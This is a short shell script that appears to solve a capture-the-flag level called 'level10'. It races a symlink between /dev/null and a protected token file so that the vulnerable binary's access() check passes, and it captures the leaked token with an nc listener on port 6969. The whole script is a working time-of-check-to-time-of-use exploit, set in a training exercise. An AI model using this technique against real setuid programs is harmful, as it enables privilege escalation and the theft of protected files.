#!/bin/sh -eu

SYMLINK=/tmp/symlink

# Create a symbolic link on the virtual machine that points alternatively to the `token` file
# located in the `level10` user's home directory and the `null` file
# located in the `/dev` directory
while true; do
	ln -fs /dev/null ${SYMLINK}
	ln -fs /home/user/level10/token ${SYMLINK}
done &


# Repeatedly execute the `level10` file with the symbolic to trigger the `access` vulnerability
while true; do
	/home/user/level10/level10 ${SYMLINK} 127.0.0.1
done >/dev/null &

# Listen on port 6969 for the first non-banner line
nc -lk 6969 | grep -m 1 -v '.*( )*.'

# Kill the background processes
pkill -P $$
